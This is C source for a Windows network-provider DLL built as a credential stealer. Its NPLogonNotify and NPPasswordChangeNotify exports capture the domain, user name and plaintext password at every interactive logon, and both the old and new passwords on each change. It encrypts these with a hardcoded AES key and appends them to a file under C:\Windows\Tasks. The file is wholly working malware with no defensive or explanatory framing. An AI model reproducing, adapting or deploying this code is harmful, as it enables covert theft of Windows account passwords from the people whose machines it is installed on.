#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>

#define WNNC_SPEC_VERSION                0x00000001
#define WNNC_SPEC_VERSION51              0x00050001
#define WNNC_NET_TYPE                    0x00000002
#define WNNC_START                       0x0000000C
#define WNNC_WAIT_FOR_START              0x00000001
#ifndef FILE_PATH
#define FILE_PATH TEXT("C:\\Windows\\Tasks\\default.txt")
#endif
#ifndef AES_PWD
#define AES_PWD "TEST1234"
#endif

typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, *PUNICODE_STRING;
typedef enum _MSV1_0_LOGON_SUBMIT_TYPE { MsV1_0InteractiveLogon = 2, MsV1_0Lm20Logon, MsV1_0NetworkLogon, MsV1_0SubAuthLogon, MsV1_0WorkstationUnlockLogon = 7, MsV1_0S4ULogon = 12, MsV1_0VirtualLogon = 82, MsV1_0NoElevationLogon = 83, MsV1_0LuidLogon = 84, } MSV1_0_LOGON_SUBMIT_TYPE, *PMSV1_0_LOGON_SUBMIT_TYPE;
typedef struct _MSV1_0_INTERACTIVE_LOGON { MSV1_0_LOGON_SUBMIT_TYPE MessageType; UNICODE_STRING LogonDomainName; UNICODE_STRING UserName; UNICODE_STRING Password; } MSV1_0_INTERACTIVE_LOGON, *PMSV1_0_INTERACTIVE_LOGON;


LPWSTR GetCurrentTimestamp()
{
    SYSTEMTIME st;
    GetLocalTime(&st);

    LPWSTR timestamp = (LPWSTR)malloc(21 * sizeof(WCHAR));
    if (!timestamp)
        return NULL;

   swprintf(timestamp, 21, L"%04d-%02d-%02d %02d:%02d:%02d",
             st.wYear, st.wMonth, st.wDay,
             st.wHour, st.wMinute, st.wSecond);

    return timestamp;
}


LPWSTR BuildLogString(LPCWSTR operation, PUNICODE_STRING domain, PUNICODE_STRING username, PUNICODE_STRING password, LPCWSTR timestamp)
{
    size_t operationLength = wcslen(operation);
    size_t timestampLength = wcslen(timestamp);
    size_t domainLength = domain->Length / sizeof(WCHAR);
    size_t usernameLength = username->Length / sizeof(WCHAR);
    size_t passwordLength = password->Length / sizeof(WCHAR);
    size_t totalLength = timestampLength + operationLength + domainLength + usernameLength + passwordLength + 100;

    LPWSTR logString = (LPWSTR)malloc(totalLength * sizeof(WCHAR));
    if (!logString)
        return NULL;

    swprintf(logString, totalLength,
        L"{\"timestamp\":\"%s\",\"operation\":\"%.*s\",\"domain\":\"%.*s\",\"username\":\"%.*s\",\"password\":\"%.*s\"}",
        timestamp,
        (int)operationLength, operation,
        (int)domainLength, domain->Buffer,
        (int)usernameLength, username->Buffer,
        (int)passwordLength, password->Buffer);
    return logString;
}


LPWSTR EncryptWithAES(LPWSTR input, LPCSTR password)
{
    if (!input) return NULL;
    int inputLen = WideCharToMultiByte(CP_UTF8, 0, input, -1, NULL, 0, NULL, NULL);
    if (inputLen == 0) return NULL;

    BYTE* utf8Data = (BYTE*)LocalAlloc(LMEM_ZEROINIT, inputLen);
    if (!utf8Data) return NULL;

    WideCharToMultiByte(CP_UTF8, 0, input, -1, (LPSTR)utf8Data, inputLen, NULL, NULL);

    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;
    BYTE* encryptedData = NULL;
    DWORD dataLen = inputLen;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
        goto cleanup;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
        goto cleanup;
    if (!CryptHashData(hHash, (BYTE*)password, (DWORD)strlen(password), 0))
        goto cleanup;
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey))
        goto cleanup;
    encryptedData = (BYTE*)LocalAlloc(LMEM_ZEROINIT, dataLen + 16); // espacio extra
    if (!encryptedData) goto cleanup;
    memcpy(encryptedData, utf8Data, dataLen);

    if (!CryptEncrypt(hKey, 0, TRUE, 0, encryptedData, &dataLen, dataLen + 16))
        goto cleanup;

    DWORD base64Len = 0;
    CryptBinaryToStringA(encryptedData, dataLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64Len);
    CHAR* base64A = (CHAR*)LocalAlloc(LMEM_ZEROINIT, base64Len);
    CryptBinaryToStringA(encryptedData, dataLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64A, &base64Len);

    int base64WLen = MultiByteToWideChar(CP_ACP, 0, base64A, -1, NULL, 0);
    LPWSTR base64W = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, base64WLen * sizeof(WCHAR));
    MultiByteToWideChar(CP_ACP, 0, base64A, -1, base64W, base64WLen);

    LocalFree(utf8Data);
    LocalFree(encryptedData);
    LocalFree(base64A);
    if (hKey) CryptDestroyKey(hKey);
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);

    return base64W;

cleanup:
    if (utf8Data) LocalFree(utf8Data);
    if (encryptedData) LocalFree(encryptedData);
    if (base64A) LocalFree(base64A);
    if (hKey) CryptDestroyKey(hKey);
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);
    return NULL;
}


void SavePassword(PWCHAR operation, PUNICODE_STRING domain, PUNICODE_STRING username, PUNICODE_STRING password)
{
    LPCSTR aes_password = AES_PWD;
    LPWSTR timestamp = GetCurrentTimestamp();
    LPWSTR logString = BuildLogString(operation, domain, username, password, timestamp);
    logString = EncryptWithAES(logString, aes_password);
    wcsncat(logString, L"\n", 2);

    HANDLE hFile;
    DWORD dwWritten;
    hFile = CreateFile(
        FILE_PATH,
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile != INVALID_HANDLE_VALUE)
    {
        SetFilePointer(hFile, 0, NULL, FILE_END);
        WriteFile(hFile, logString, (DWORD)wcslen(logString) * sizeof(WCHAR), &dwWritten, NULL);
        CloseHandle(hFile);
    }
}


__declspec(dllexport)
DWORD
APIENTRY
NPGetCaps(
    DWORD nIndex
)
{
    switch (nIndex)
    {
    case WNNC_SPEC_VERSION:
        return WNNC_SPEC_VERSION51;

    case WNNC_NET_TYPE:
        return WNNC_CRED_MANAGER;

    case WNNC_START:
        return WNNC_WAIT_FOR_START;

    default:
        return 0;
    }
}


__declspec(dllexport)
DWORD
APIENTRY
NPLogonNotify(
    PLUID lpLogonId,
    LPCWSTR lpAuthInfoType,
    LPVOID lpAuthInfo,
    LPCWSTR lpPrevAuthInfoType,
    LPVOID lpPrevAuthInfo,
    LPWSTR lpStationName,
    LPVOID StationHandle,
    LPWSTR* lpLogonScript
)
{
    SavePassword(
        L"LOGON",
        &(((MSV1_0_INTERACTIVE_LOGON*)lpAuthInfo)->LogonDomainName),
        &(((MSV1_0_INTERACTIVE_LOGON*)lpAuthInfo)->UserName),
        &(((MSV1_0_INTERACTIVE_LOGON*)lpAuthInfo)->Password));
    lpLogonScript = NULL;
    return WN_SUCCESS;
}


__declspec(dllexport)
DWORD
APIENTRY
NPPasswordChangeNotify(
    LPCWSTR lpAuthentInfoType,
    LPVOID lpAuthentInfo,
    LPCWSTR lpPreviousAuthentInfoType,
    LPVOID lpPreviousAuthentInfo,
    LPWSTR lpStationName,
    LPVOID StationHandle,
    DWORD dwChangeInfo
)
{
    SavePassword(
        L"PWD_UPDATE_OLD",
        &(((MSV1_0_INTERACTIVE_LOGON*)lpPreviousAuthentInfo)->LogonDomainName),
        &(((MSV1_0_INTERACTIVE_LOGON*)lpPreviousAuthentInfo)->UserName),
        &(((MSV1_0_INTERACTIVE_LOGON*)lpPreviousAuthentInfo)->Password));
    SavePassword(
        L"PWD_UPDATE_NEW",
        &(((MSV1_0_INTERACTIVE_LOGON*)lpAuthentInfo)->LogonDomainName),
        &(((MSV1_0_INTERACTIVE_LOGON*)lpAuthentInfo)->UserName),
        &(((MSV1_0_INTERACTIVE_LOGON*)lpAuthentInfo)->Password));

    SetLastError(WN_NOT_SUPPORTED);
    return WN_NOT_SUPPORTED;
}